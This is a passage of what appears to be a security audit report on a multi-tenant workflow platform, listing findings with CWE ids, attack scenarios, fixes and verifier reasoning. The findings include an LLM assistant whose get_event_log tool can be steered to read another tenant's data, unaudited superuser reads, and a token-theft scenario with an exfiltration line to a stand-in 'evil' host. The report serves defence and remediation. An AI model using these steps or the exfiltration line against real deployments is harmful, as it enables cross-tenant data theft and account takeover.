But that context is irrelevant to the query because the query never reads it. caseId flows straight from the LLM tool arg: agent.ts:68 runTool → tools.ts:393 `String(args.caseId ?? "")` → handleGetEventLog. No validation, no normalization.

4) No PDP gate applies: get_event_log is a READ tool, not in TOOL_WRITE_ACTIONS (tools.ts:31-42), so the `if (action) await guardData(action)` at tools.ts:384 never fires for it.

Net: an authenticated user (even a viewer) of org A / workflow X can have the assistant call get_event_log with any foreign caseId and receive that case's event timeline metadata (eventName, eventRef, boundedContext, role, businessAt, occurredAt) belonging to another org or another workflow — a CWE-639 cross-tenant / cross-workflow authorization bypass. No upstream guard, sanitizer, type constraint, or NODE_ENV gate prevents it.

title: Break-glass (superuser) cross-tenant data-plane reads leave no audit trail
cwe: CWE-778: Insufficient Logging
description:
Break-glass accountability is only enforced on the narrow set of actions that flow through `ensureAllowed()` (control-plane writes and the org-admin-gated control reads via `assertOrgAdmin`). `ensureAllowed` is what records the `break_glass.<action>` audit row:

```js
const breakGlass = !!ctx.actingAsPlatformAdmin;
await recordAudit({ organizationId: ctx.organizationId, actorPrincipalId: ctx.principal.id,
  action: breakGlass ? `break_glass.${action}` : action, ... });
```

But the entire DATA plane is reachable cross-tenant by a break-glass superuser and is NOT audited. When a platform admin selects an org it is not a member of, `resolveTenantContext` sets `actingAsPlatformAdmin` and binds that org + a workflow in it (src/platform/authn/index.ts:142-147, 177). Member-scoped reads then run with no `ensureAllowed` call and therefore no audit: e.g. `/org/portfolio` → `computePortfolio(ctx.organizationId)` (src/http/org-routes.ts:24-31), `/sim/event-log` which returns FULL event rows including `payload` (no `select`, src/http/routes.ts:159-163), `/api/bc/:bc/raw`, `/sim/instance/:id`, etc. This directly contradicts the security control the code documents — 'a superuser peeking into another tenant always leaves a trail' (control-routes.ts:67-68) — which in practice only holds for control-plane admin reads, not for the tenant's actual business data and event payloads.
attack_scenario: A malicious or compromised superuser (or anyone who obtains the superadmin credential / a superadmin session) sends `X-Org-Id: <victim-org>` plus `X-Workflow-Id: <victim-workflow>` and GETs `/sim/event-log` and `/api/bc/<bc>/raw`. They exfiltrate the victim tenant's full event payloads and projection-table rows, and `/v1/audit/verify` + `/v1/audit` for the victim org show ZERO record that the superuser ever entered or read anything — destroying after-the-fact accountability for privileged cross-tenant access, exactly the property an on-prem Ericsson deployment relies on.
recommendation: Audit break-glass entry itself once per request when `actingAsPlatformAdmin` is set (e.g. emit a `break_glass.enter` row in the tenant plugin / context resolution to the target org's chain), independent of whether a downstream `ensureAllowed` fires. Optionally route data-plane reads under break-glass through an audited read-gate. At minimum, narrow the documentation so it does not over-claim that all superuser tenant access is trailed.
exploitability: Requires a genuine platform-admin (superuser) session token. The forgeable dev-shim is hard-disabled for platform admins (devSubjectAllowed returns false when isPlatformAdmin, authn/index.ts:69-73), and in production only a real /v1/auth/login session authenticates — so this is NOT reachable pre-auth or by an unprivileged tenant user. It is exploitable by a malicious or compromised superuser (insider, or anyone who steals the superadmin credential/session): they set X-Org-Id + X-Workflow-Id to a victim tenant and GET /sim/event-log, /api/bc/:bc/raw, /sim/instance/:id, /org/portfolio, exfiltrating full event payloads and projection rows while the victim org's audit chain records nothing. The break-glass access itself is intentional and PDP-allowed; the defect is solely the missing audit trail (defeats a relied-upon on-prem accountability control), which keeps it at medium rather than critical since no unprivileged/pre-auth boundary is crossed.
verifier_reasoning: (confirmed) Every link in the finding's chain checks out in code. Cross-tenant break-glass entry: src/platform/authn/index.ts:142-147 sets actingAsPlatformAdmin=true and binds a non-member org from X-Org-Id; lines 174-189 bind a workflow in that org. PDP allows the read: src/platform/pdp/index.ts:171-172 returns ALLOW for view/edit/administer under break-glass. The audit row (break_glass.<action>) is written ONLY inside ensureAllowed (src/platform/authz.ts:25), which on the data plane is reached only through guardData (writes/connector-pull) and assertOrgAdmin (org-admin-gated reads). The cited cross-tenant READS bypass it: /sim/event-log (src/http/routes.ts:156-164) returns full EventLog rows including payload with no select and no guardData; /api/bc/:bc/raw (src/http/bc-routes.ts:173-181) returns projection rows ungated; /org/portfolio + /org/mappings GET (src/http/org-routes.ts:24-31,36-43) call only requireTenant(); likewise /sim/instance/:id, /sim/flow-aggregate, /sim/meta, /sim/cases, /api/ontology. No global middleware audits: server.ts:47-52 only sets CSP headers; tenant-plugin.ts:51-71 only resolves/binds context. The login audit (control-routes.ts:198) is written to SYSTEM_ORG_ID, not the victim org's chain, so the victim org's /v1/audit shows zero record of the superuser's read. The documented guarantee 'a superuser peeking into another tenant always leaves a trail' (control-routes.ts:67-68) therefore over-claims — it holds only for the assertOrgAdmin path, not for tenant business data and event payloads. The gap is a genuine CWE-778 accountability hole, exactly as described. || (confirmed) No upstream mitigation defeats this; the finding is accurate. (1) Break-glass cross-tenant binding is real: src/platform/authn/index.ts:142-147 sets actingAsPlatformAdmin=true and binds a non-member org from X-Org-Id; lines 176-178 then bind a victim workflow; src/platform/pdp/index.ts:171 grants break-glass admins administer/edit/view in the target org so reads pass. (2) The break_glass.<action> audit row is written ONLY inside ensureAllowed (src/platform/authz.ts:24-33). (3) The cited data-plane reads never call ensureAllowed/guardData: /sim/event-log (src/http/routes.ts:156-164) runs prisma.eventLog.findMany with eventLogOrgWhere() and NO select (returns full rows incl. payload), and eventLogOrgWhere() (src/platform/tenancy/event-scope.ts:14-22) scopes to the bound victim workflow/org; /org/portfolio (src/http/org-routes.ts:24-31) calls computePortfolio(ctx.organizationId) directly. (4) Neither onRequest hook audits entry: the tenant plugin only resolves/binds context (src/platform/http/tenant-plugin.ts:51-71) and the server hook only sets headers (src/server.ts:47-52). So a break-glass superuser reads a victim tenant's full event payloads and projections with zero audit rows. (5) The documented guarantee 'a superuser peeking into another tenant always leaves a trail' (src/platform/http/control-routes.ts:66-68) only holds for assertOrgAdmin control reads, which do call ensureAllowed — it over-claims for the data plane.

title: Cross-tenant provenance bleed: global _app_meta["adapterModes"] key + process-global cache mis-stamps another tenant's EventLog and leaks adapter identity
cwe: CWE-488: Exposure of Data Element to Wrong Session / CWE-668
description: Adapter provenance MODE is persisted under a SINGLE flat key with no tenant scoping: `const META_KEY = "adapterModes";` and read/written via the un-scoped `_app_meta` table (`getMeta`/`setMeta` in projection-store.ts:338-351 do `WHERE key = ?` only). The map is keyed by bounded-context NAME and shared across every org/workflow, and the in-process memo `let cache: ...` (provenance.ts:27) is also process-global and only ever invalidated by tests. `setAdapterMode(adapter.boundedContext, adapter.mode, adapter.id)` is reachable from a tenant request via `POST /api/adapters/:id/pull` -> ingestPull (src/packs/ingest.ts:80), `POST /api/data/reimport-all`, and model-apply reingest. `provenanceFor(bc)` is then read at the single EventLog write chokepoint `emit()` (src/events/bus.ts:134) for EVERY event, and in `provenanceMeta()` which is returned to clients by `GET /sim/meta` and `GET /api/bc` / `GET /api/bc/:bc` (membership-scoped reads available to any org member, viewers included). Contrast: the org-dashboard mapping store correctly namespaces its key as `orgdash:mappings:<orgId>` (org-dashboard.ts:59) — provenance does not. Impact is two-fold across the tenant boundary whenever two tenants/workflows share a bounded-context name (e.g. "OrderManagement", "Maintenance" — ubiquitous): (a) integrity — Tenant A configuring a `live`/`recorded` connector flips the default provenance for that BC name globally, so Tenant B's purely SIMULATED simulator-stepped events (genericApply -> emitFor -> emit with no explicit provenance) get stamped `live`/`recorded` on B's immutable EventLog rows, corrupting B's org-dashboard `twinTrust`/`conformance` governance metric (org-dashboard.ts:460 counts provenance recorded|live as 'real'); (b) confidentiality — `provenanceMeta().byContext[bc].adapter` (provenance.ts:88) discloses Tenant A's adapter id + mode + timestamp to any member/viewer of Tenant B via the BC reads above.
attack_scenario: Org A (member with connector.edit) creates and pulls a `live` connector for bounded context "OrderManagement": POST /api/adapters/ordermanagement-order/pull. This writes _app_meta["adapterModes"] = {"OrderManagement":{mode:"live",adapter:"ordermanagement-order",at:...}} globally. Org B (different tenant) has a workflow whose model also has a "OrderManagement" bounded context. (1) A low-privilege viewer in Org B calls GET /sim/meta or GET /api/bc and sees provenance.byContext.OrderManagement = {mode:"live", adapter:"ordermanagement-order"} — learning Org A connected a live system and its adapter id. (2) Org B runs the simulator (POST /sim/cases, /sim/next) in that workflow; every emitted event defaults to provenanceFor("OrderManagement") = "live", so B's fabricated/simulated events are recorded as real and B's portfolio dashboard reports inflated twin-trust/conformance — a false governance signal for an Ericsson on-prem deployment.
recommendation: Scope the adapter-mode store per workflow (and org), exactly like the org-dashboard mappings: persist under a per-(org,workflow) key (e.g. `adapterModes:<orgId>:<workflowId>`) or move it into the per-workflow gen_ namespace, and make the in-process `cache` keyed by the same scope (or drop the cache and read scoped each time). Pass the resolved tenant scope through setAdapterMode/getAdapterModes/provenanceFor rather than relying on a bare BC name.
exploitability: Authenticated, not pre-auth and not RCE. Write side needs connector.edit (org owner/editor) in the attacking org to run POST /api/adapters/:id/pull; read side needs only any member/viewer session (no guardData on /sim/meta, /api/bc). title: mustChangePassword is never enforced server-side — a reset's only server effect is cosmetic for an already-authenticated session
cwe: CWE-285: Improper Authorization
description: Setting mustChangePassword=true is the sole server-observable effect of an admin reset (besides the new hash), but no server code gates requests on it. resolveTenantContext()/resolveIdentity() never read mustChangePassword; the flag is only echoed back in /v1/auth/login (control-routes.ts:203) and /v1/whoami (control-routes.ts:140) for the SPA to redirect the UI. A session-authenticated caller whose password was just reset (mustChangePassword=true) retains full, unrestricted API access — the 'must change before you can do anything' intent is enforced purely in client JavaScript, which an attacker holding the bearer token simply ignores. This compounds finding 1: even the one durable side effect of a reset does nothing to contain a live session.
attack_scenario: Attacker holds Mallory's session token. Admin resets the password (mustChangePassword=true). The attacker never visits the SPA, so the client-side change-password gate is irrelevant; they keep calling the JSON API directly with the old token and perform any action Mallory's roles permit, despite the account being flagged must-change. The flag provides a false sense of containment in the audit/admin view.
recommendation: Enforce mustChangePassword on the server: in the onRequest auth path (or a guard), when the resolved identity has mustChangePassword=true, reject all routes except /v1/account/password, /v1/whoami, and /v1/auth/logout with a 403 that the client maps to the change-password screen. Combined with session revocation on reset (finding 1), this makes admin resets actually binding.
exploitability: Requires a VALID authenticated session token — not pre-auth and not cross-tenant. Two reachable preconditions: (a) an attacker already holding a victim's bearer token, in which case an admin reset fails to contain them because sessions aren't revoked AND mustChangePassword isn't enforced; or (b) a legitimately-invited member who received an admin-known temp password (mustChangePassword=true), logs in to get a session token, then uses the JSON API directly and never rotates the temp password — leaving the admin-known credential valid indefinitely (impersonation persistence within the org). Bounded to authenticated/within-org actors; no privilege escalation beyond the account's own roles. Defense-in-depth gap that mainly matters chained with the session-non-revocation issue (finding 1).
verifier_reasoning: (confirmed) The core technical claim is verified against the code. `mustChangePassword` is set true on issue/reset (src/platform/provisioning/index.ts:133) and cleared on self-service change (src/platform/http/control-routes.ts:228), but it is NEVER read by any request-gating code. The full set of read sites (grep over src/) is only: /v1/whoami echo (control-routes.ts:134,140) and /v1/auth/login echo (control-routes.ts:203) — both purely informational for the SPA. The authentication/authorization path that actually gates requests — resolveIdentity()/resolveTenantContext() in src/platform/authn/index.ts:75-198 and the onRequest hook in src/platform/http/tenant-plugin.ts:51-71 — never references mustChangePassword; resolveIdentity only enforces identity.status === "active" (authn/index.ts:82). There is no preHandler or guard that rejects routes when the flag is set. So the flag has zero server-side teeth; the change-password gate is enforced purely in client JS, which a bearer-token holder can ignore by calling the JSON API directly. This compounds the reset path: issueMemberCredential (provisioning/index.ts:125-144) updates the hash + flag and audits, but — unlike the self-service change at control-routes.ts:231 which calls platSession.updateMany({revokedAt}) — it does NOT revoke existing sessions, so a live token still resolves via resolveSession (authn/index.ts:79-84) after a reset. Net: an authenticated caller (stolen token after an admin 'containment' reset, or an invited member who skips the SPA) retains full unrestricted API access despite mustChangePassword=true. Exploitable exactly as described. || (confirmed) The finding's factual core is verifiably true and I found no upstream guard to refute it. `mustChangePassword` is written only in issueMemberCredential (provisioning/index.ts:131-134), reached via invite (control-routes.ts:387) and admin reset (control-routes.ts:409). It is read ONLY for client echo at whoami (control-routes.ts:134,140) and login (control-routes.ts:203), and cleared on self-service change (control-routes.ts:228) — those 5 sites are the only references in src/. There is no preHandler/guard gating on the flag. The compounding premise also holds: admin reset (issueMemberCredential) rewrites the hash + sets the flag but does NOT revoke sessions; only the self-service change revokes (control-routes.ts:231). So a session-authenticated caller flagged must-change retains full API access and the 'must change before anything' intent lives purely in client JS. No NODE_ENV gate, sanitizer, parameterization, or unreachability defeats this, so it cannot be refuted as a false positive. However, non-enforcement grants NO access beyond what the held credential already grants — no privilege escalation or auth bypass — so it is a credential-lifecycle/defense-in-depth gap, not the CWE-285 authorization bypass implied.

title: Unthrottled compute/DB exhaustion: /sim/run-all (500-step loop) and /api/data/reimport-all (full wipe + re-pull every connector)
cwe: CWE-770: Allocation of Resources Without Limits or Throttling
description: Two further expensive endpoints share the same missing-throttle root cause. /sim/run-all runs `for (let guard = 0; guard < 500; guard++) { const step = await genericStep(body.caseId); ... }` — up to 500 sequential simulator steps (each a chain of raw-SQL gen_-table reads/writes via projection-store) behind only `guardData('workflow.sim.write')`, with no per-identity throttle and no concurrency limit; a member with write capability can fire many of these in parallel to saturate the single SQLite writer and the Node event loop. /api/data/reimport-all (`await genericDeleteAll(); const result = await reingestAll({ limit });` with default `limit = 1000`) empties every gen_ table AND the entire workflow event log, then re-pulls every configured connector and derives — a heavy, destructive, repeatable operation gated only by `guardData('workflow.sim.administer')` with no throttle, so an admin-capable member (or a compromised admin token) can loop it to pin CPU/IO and repeatedly destroy/rebuild data. Neither endpoint has any rate limiting; loginRateLimiter is the only limiter in the codebase.
attack_scenario: A member with workflow.sim.write loops `POST /sim/run-all {caseId}` across many cases concurrently; each call drives up to 500 synchronous genericStep iterations against the single-process SQLite DB, blocking the event loop and starving all other requests (including login and the data plane) for the whole on-prem instance. Separately, an account with workflow.sim.administer scripts repeated `POST /api/data/reimport-all` calls: each wipes and rebuilds every table and re-pulls every connector, producing sustained CPU/IO load and continuous data churn with no backpressure or throttle.
recommendation: Apply the same per-identity/per-org throttle to /sim/run-all and /api/data/reimport-all, and add a server-side concurrency guard (e.g. reject overlapping run-all/reimport for the same workflow while one is in flight). Make the 500-step and 1000-row bounds configurable and lower the defaults; consider running these as queued/background jobs rather than synchronous request handlers so one caller cannot block the event loop for the whole single-process deployment.
exploitability: Requires an authenticated principal with an org-level grant: workflow.sim.write (org editor/owner) for /sim/run-all, workflow.sim.administer (org admin/owner) for /api/data/reimport-all. Not reachable pre-auth (deny-by-default tenant plugin → 401) and not a cross-tenant data path (PDP scopes to the caller's own workflow/org). The destructive reimport is self-scoped to the attacker's own workflow data — its intended admin function. The only cross-tenant angle is availability: an authenticated editor in any org can flood run-all/reimport to contend the shared single-process SQLite writer and degrade latency for other orgs on the same on-prem instance. Availability-only, no confidentiality/integrity impact, and no hard event-loop freeze because the DB layer is async Prisma. A defense-in-depth throttling/concurrency-guard gap reachable only by a trusted authenticated insider.
verifier_reasoning:
(confirmed) The missing-throttle/no-concurrency-guard claim (CWE-770) is real and the endpoints behave exactly as described. /sim/run-all (src/http/routes.ts:407-418) runs a hardcoded `for (let guard=0; guard<500; guard++) await genericStep(...)` loop behind only guardData("workflow.sim.write"); /api/data/reimport-all (src/http/routes.ts:302-312) does genericDeleteAll()+reingestAll({limit:1000}) behind only guardData("workflow.sim.administer"). Neither has a per-identity/per-org limiter or an in-flight guard — loginRateLimiter (src/platform/authn/rate-limit.ts:125) is the only limiter and covers only /v1/auth/login. A concrete attack exists: an authenticated org editor (workflow.sim.write→edit, action-map.ts:35) scripts many parallel run-all calls and floods the single SQLite writer, degrading latency for co-tenant orgs on the same single-process on-prem box. However the claim is materially overstated in two ways that lower severity: (1) it is NOT reachable pre-auth or cross-tenant for data — registerTenantPlugin (src/platform/http/tenant-plugin.ts:51-71) is deny-by-default 401, and guardData (src/platform/authz.ts:45-60) scopes every action to the caller's own server-resolved workflow/org, so reimport-all only wipes/rebuilds the caller's OWN workflow data (its intended admin function); (2) the "blocks the event loop and starves all requests including login" claim is wrong — the handlers use async Prisma (package.json:24; genericStep is async at src/twin/sim.ts:274, reingestAll async at src/packs/ingest.ts:143), so each await yields and other requests interleave. The real impact is SQLite-writer contention / degradation, not a hard freeze. So: real and exploitable as an authenticated availability-degradation DoS, but trusted-insider, availability-only, partly self-scoped. || (confirmed) The finding's code-level facts are accurate, so it is not a literal false positive. `/sim/run-all` (src/http/routes.ts:407-418) loops `genericStep` up to 500 times behind only `guardData("workflow.sim.write")`, and `/api/data/reimport-all` (src/http/routes.ts:302-312) does `genericDeleteAll()` + `reingestAll({limit=1000})` behind only `guardData("workflow.sim.administer")`. There is genuinely no per-identity throttle or concurrency guard on either; `loginRateLimiter` (src/platform/authn/rate-limit.ts:125) is the only limiter and is wired solely into `/v1/auth/login` (src/platform/http/control-routes.ts:178). server.ts registers only cors, fastify-static and a header hook — no global rate-limit/bodyLimit/concurrency plugin. I could NOT find an upstream guard that defeats the resource-exhaustion itself, so per the lens rule I cannot refute it.

HOWEVER the claimed severity is overstated, and the upstream authorization boundary materially narrows the threat. `guardData` (src/platform/authz.ts:45-60) calls `requireTenant()` (fails closed off-request) and then PDP `authorize()` against a resource whose `id/workflowId/organizationId` are taken from the resolved tenant context (src/platform/http/tenant-plugin.ts onRequest/preHandler), NEVER from client input. So both endpoints are: (1) post-authentication only — no pre-auth reach; (2) tenant-scoped — a caller can only churn their OWN workflow's gen_ tables/event log, no cross-tenant impact; (3) capability-gated — the actor must already hold `workflow.sim.write` (or the stronger `workflow.sim.administer`) explicitly granted on their own workflow. The reimport wipe is, moreover, a deliberate, intended admin feature.

The residual is a generic authenticated-insider availability concern on a single-process Node/SQLite box, and it is not distinctly worse than hammering any other write endpoint (`/sim/next` at routes.ts:377, `/commands/*` via `guardData("workflow.command.write")`, `/chat`). The 500 is an infinite-loop guard, not 500 guaranteed heavy ops — the loop breaks on `step.done`, so per-call cost is bounded by model size. For an on-prem trusted-employee Ericsson install where the actor is an authenticated, capability-holding insider scoped to their own tenant, this is a defense-in-depth availability hardening item, not a medium security vulnerability.

title: Session bearer token stored in localStorage (ql.token) — readable by any JS, no HttpOnly cookie
cwe: CWE-522: Insufficiently Protected Credentials
description: The auth token is persisted in localStorage and replayed as a bearer header: `setSession: (token) => localStorage.setItem("ql.token", token || "")` and `if (token) headers["Authorization"] = \`Bearer ${token}\``. localStorage is fully readable by any script that runs in the origin, so the entire defense against session theft rests on 'no script ever executes' — i.e. on the CSP holding perfectly. There is no HttpOnly/Secure/SameSite cookie containing the credential, so the moment any script-execution path opens (the external-CDN allowance above, a future regression that re-adds 'unsafe-inline', or any DOM/eval gadget), the long-lived session token is trivially read and exfiltrated for account takeover. For a highest-bar multi-tenant deployment the credential should be unreadable by JS.
attack_scenario: Any successful script execution in the origin (see the cdn.tailwindcss.com finding, or any reintroduced inline-script allowance) runs `localStorage.getItem('ql.token')` and ships it off-box via top-level navigation. With the token an attacker calls the API as the victim (admin) from anywhere — there is no cookie/SameSite or HttpOnly barrier and the token is not bound to the browser.
recommendation: Move the session to a Set-Cookie with HttpOnly + Secure + SameSite=Strict (or Lax) issued by /v1/auth/login, and have the server read the cookie instead of the Authorization header; keep CSRF protection (SameSite + a double-submit/Origin check). Then no SPA code can read the credential, containing XSS-to-ATO blast radius. Also consider short token TTL + rotation.
exploitability: Conditional, not standalone. Requires a script-execution primitive in the origin (XSS or compromise of the whitelisted cdn.tailwindcss.com Play CDN, or a future 'unsafe-eval' gadget). The app's no-'unsafe-inline' CSP + pervasive escapeHtml() defend the common in-app XSS vectors, so there is no pre-auth standalone exploit. But once any script runs in-origin, the victim's (incl. admin) 12h, browser-unbound session token is trivially read from localStorage and exfiltrated via top-level navigation for full cross-device account takeover. Authed-victim-required, not cross-tenant/RCE on its own — a blast-radius amplifier, which is why medium (not critical) is correct for an on-prem Ericsson install.
verifier_reasoning:
(confirmed) Code matches the finding exactly. web/app.js:196,199 store the session token in localStorage (ql.token); web/app.js:211 replays it as `Authorization: Bearer`. There is NO cookie path anywhere — grep for Set-Cookie/reply.cookie/@fastify/cookie across src/ is empty, and src/platform/http/control-routes.ts:197 returns {token} in the JSON login body for the SPA to persist. So the credential is fully readable by any in-origin script (no HttpOnly/Secure/SameSite). The token is also long-lived and not browser-bound: src/platform/authn/sessions.ts:17 sets a 12h TTL and resolveSession (:65) checks only hash/revoked/expiry — no IP/UA/origin binding — so a stolen token replays from anywhere for up to 12h, including an admin victim. This is a real CWE-522 weakness, not a misreading, hence not refuted. It is NOT independently exploitable: it requires a script-execution primitive. The app blunts the common vectors (CSP script-src has no 'unsafe-inline' at src/server.ts:31, and the ~23 innerHTML sinks route untrusted data through escapeHtml() at web/app.js:415), so I cannot construct a standalone in-app exploit. However the residual script-execution surface is real and present in code: 'unsafe-eval' is enabled and https://cdn.tailwindcss.com (Tailwind Play CDN, explicitly not-for-production) is a whitelisted third-party script loaded on every page (web/index.html:8). Any compromise/hijack of that CDN, or an 'unsafe-eval' gadget, runs JS in-origin, reads localStorage.getItem('ql.token'), and exfiltrates via top-level navigation (location='https://evil/?t='+token) — connect-src 'self' and img-src 'self' data: block XHR/img exfil but navigation is ungated. Net: a confirmed defense-in-depth credential-protection gap that amplifies any XSS/CDN-compromise into full, durable, browser-unbound admin account takeover; HttpOnly would contain that blast radius. || (refuted) The finding's FACTS are accurate: the bearer token is persisted in localStorage (web/app.js:199 `setSession`) and replayed as `Authorization: Bearer ${token}` (web/app.js:211); the login route returns the token in the JSON body (src/platform/http/control-routes.ts:201) and there is NO `Set-Cookie` anywhere in src/ (grep for Set-Cookie/httpOnly/sameSite returns nothing), so the credential is genuinely JS-readable with no HttpOnly/SameSite cookie. However, this is a defense-in-depth/architecture observation, NOT an independently exploitable vulnerability, and the realized harm is gated by upstream mitigations:

1) The exploit is 100% contingent on a SEPARATE XSS. The finding's own attack_scenario opens with "Any successful script execution in the origin" and explicitly chains off "the cdn.tailwindcss.com finding... or any reintroduced inline-script allowance... or any DOM/eval gadget." There is no current independent script-execution path. The CSP at src/server.ts:29-39 sets `script-src 'self' 'unsafe-eval' https://cdn.tailwindcss.com` with NO `'unsafe-inline'` (line 31), so injected inline <script> and inline event handlers (onerror=, onclick=) cannot execute — the realistic injection→localStorage-read path is blocked. The CSP comment (src/server.ts:23-25) confirms output is escaped first ("defense-in-depth behind output escaping"), and `object-src 'none'` + `base-uri 'self'` further constrain gadgets. Manufacturing exploitability by chaining this to the distinct cdn.tailwindcss.com supply-chain finding is double-counting two separate findings.

2) Server-side the credential is well protected: an opaque 256-bit random token (src/platform/authn/sessions.ts:56), stored only as sha256 (line 59), with a TTL (`SESSION_TTL_MS`, line 57) and revocation on logout/password-rotate (revokeSession lines 72-77; control-routes.ts:232 rotates on password change). It is not a long-lived non-expiring credential.

3) localStorage-bearer is a standard, widely-accepted SPA pattern with a real tradeoff against HttpOnly cookies (which reintroduce CSRF). It is not a vulnerability per se; the recommendation (HttpOnly+SameSite cookie) is a legitimate hardening, not a fix for an active exploit.

Net: no pre-auth and no cross-tenant exposure on its own — the attacker needs a victim's already-running authenticated session PLUS a script-execution gadget that the CSP currently denies. This is a valid hardening suggestion, not a confirmed exploitable medium-severity vuln.

title: Non-atomic model swap: gen_ projection tables dropped/recreated and event log wiped with no transaction or lock (TOCTOU availability + crash-integrity)
cwe: CWE-362: Concurrent Execution using Shared Resource with Improper Synchronization ('Race Condition')
description:
applyWorkflowModel rebuilds a workflow's entire data plane as an UNSYNCHRONIZED, UNTRANSACTED sequence of separately-awaited writes. From src/twin/apply.ts:

```
setWorkflowModel(ctx.workflowId, workflow, overlay, v.manifestHash);   // process-global map mutated
await applyModelTables(getOntology());                                 // DROP all gen_ tables, then CREATE new ones
await prisma.eventLog.deleteMany({ where: eventLogOrgWhere() });        // wipe the event log
const rebuild = await reingestAll();                                   // best-effort repopulate
```

None of this is wrapped in prisma.$transaction(), and there is no per-workflow mutex (the only promise-queue in the codebase, src/platform/audit/index.ts serialize(), guards audit-stream appends, not model swaps). applyModelTables itself (src/twin/projection-store.ts:151) is two separate raw-SQL loops:

```
orgColCache.clear();                                  // process-global cache wiped mid-flight
for (const t of existing) await prisma.$executeRawUnsafe(`DROP TABLE IF EXISTS ${phys(t)}`);
for (const entity of ontology.entities) await prisma.$executeRawUnsafe(createTableSql(entity));  // CREATE TABLE, NOT 'IF NOT EXISTS' (line 126)
```

Every $executeRawUnsafe is its own auto-committed SQLite statement, and every await yields the Fastify event loop, so concurrent requests on the same workflow interleave with the drop/recreate window. createVersion (apply.ts:83) has ALREADY committed platOntology.currentVersionId = newVersion to the control-plane DB (ontology-store.ts:173) BEFORE any table is touched, so a crash mid-rebuild leaves the DB pointing at the new model while the gen_ tables and event log do not match it, with no rollback and no auto-repair path.
attack_scenario: All three are reachable on an on-prem multi-user org. (1) Concurrent swap collision: two PUT /v1/workflow/model (two org-admins, a double-click, or workflow-create's applyWorkflowModel racing a swap) on the same workflow both enter applyModelTables. Swap A creates gen__p<wf>_Account; swap B's `CREATE TABLE gen__p<wf>_Account` (no IF NOT EXISTS, projection-store.ts:126) throws 'table ... already exists' -> 500, after B has already DROPped tables -> workflow left half-built. (2) Read/write race: a normal user POSTs /commands/:bc/:name (or /sim/derive, or an adapter pull) for the workflow while an admin swaps the model; the command's insert/findById/update runs `$executeRawUnsafe` against phys('Account') in the gap after DROP and before CREATE -> 'no such table: gen__p<wf>_Account' 500, OR the row is written into the old table microseconds before it is dropped (silently lost), OR after eventLog.deleteMany but before reingestAll completes the data plane reads empty. The orgColCache.clear() + a hasOrgColumn() probe during the dropped window caches organization_id=false for that physical table, so post-recreate inserts skip org stamping (insert() at projection-store.ts:265) and reads skip the org filter (orgFilterSql) until the next rebuild. (3) Crash integrity: kill the process (OOM, deploy, SIGKILL) between the DROP loop and reingestAll. On restart, onRequest binds the new model from CAS (currentVersionId already advanced), but the gen_ tables are dropped/half-created and the event log may be wiped with no transaction to roll back -> the workflow is permanently model-vs-data inconsistent and its event history is unrecoverable unless connectors can reproduce it.
recommendation: Make the swap atomic and serialized: (a) wrap createVersion + applyModelTables + eventLog.deleteMany in a single prisma.$transaction (SQLite supports transactional DDL, so DROP/CREATE roll back on failure), and only flip currentVersionId after the data plane is rebuilt; (b) serialize applyWorkflowModel per workflowId with an in-process promise queue (same pattern as audit serialize()) so two swaps cannot interleave and data-plane writes cannot land mid-rebuild — or rebuild into a shadow namespace and atomically rename; (c) use CREATE TABLE IF NOT EXISTS and guard data-plane handlers so a missing table returns a retriable 503/'model rebuilding' instead of a raw 500; (d) reset orgColCache only after the new tables exist, keyed to the workflow being rebuilt rather than process-globally.
exploitability: Authenticated-only and single-org; not pre-auth, not cross-tenant, not RCE. Every swap path requires ensureAllowed("organization.administer") (control-routes.ts:685/714/728/788/815) — a trusted operator initiates the inherently-destructive swap (it is documented to drop tables and clear run history by design). No privilege boundary is crossed and no other tenant is affected; impact is availability (transient 500s, workflow needs re-apply) and integrity/data-loss within one org during a deliberate destructive admin operation. title: Platform superuser (break-glass) password is written to the data volume in cleartext on every boot — including when SUPERADMIN_PASSWORD is operator-managed
cwe: CWE-256: Plaintext Storage of a Password
description: seedSuperuser() writes the superuser credential as plaintext to `${QLERIFY_DIR}/superadmin.local.txt` whenever it knows the plaintext: `if (cred.plaintext) { ... writeFileSync(join(QLERIFY_DIR, "superadmin.local.txt"), "...password: " + cred.plaintext ...) }`. resolveSuperadminCredential returns `plaintext` not only for the first-boot random case but ALSO every time SUPERADMIN_PASSWORD is set (`if (env) return { hash: hashPassword(env), plaintext: env, generated: false }`, line 604). QLERIFY_DIR resolves to /app/.qlerify which docker-entrypoint.sh symlinks to the persistent /data volume, so the cleartext platform god-credential is (re)written to durable storage on every container start, even for operators who deliberately manage the secret via an env var / secret manager and never wanted it on disk.
attack_scenario: On the on-prem highest-bar target, any actor with read access to the /data volume — a backup/snapshot operator, a sidecar or second container sharing the mount, a restored volume image, or any unrelated arbitrary-file-read bug in the app — reads /data/qlerify/superadmin.local.txt and obtains the superuser password. The superuser is a global platform admin that can break-glass into EVERY tenant org (resolveTenantContext: `actingAsPlatformAdmin` path), so this single cleartext file is a full cross-tenant compromise.
recommendation: Only write the file in the auto-generated case and document it as a one-time bootstrap artifact; never persist a SUPERADMIN_PASSWORD-supplied secret. Better: write to a non-volume path (or stdout once) and chmod 600, and delete the file after the superuser first changes their password. At minimum, restrict the file mode and warn operators to remove it.
exploitability: Not pre-auth or network-reachable by itself. Requires read access to the /data volume: a backup/snapshot operator, a sidecar/second container sharing the mount, a restored/cloned volume image, or any unrelated arbitrary-file-read primitive in the app. Once the file is read, the obtained superuser password yields full cross-tenant compromise via the actingAsPlatformAdmin break-glass path (pdp/index.ts:171). The permissive default file mode (no chmod 600) widens local read access. Classed low/defense-in-depth: the credential is already operator-known and exposure depends on a secondary filesystem-access path; could be argued medium if volume backups/snapshots are handled by a lower-trust party in an on-prem deployment.
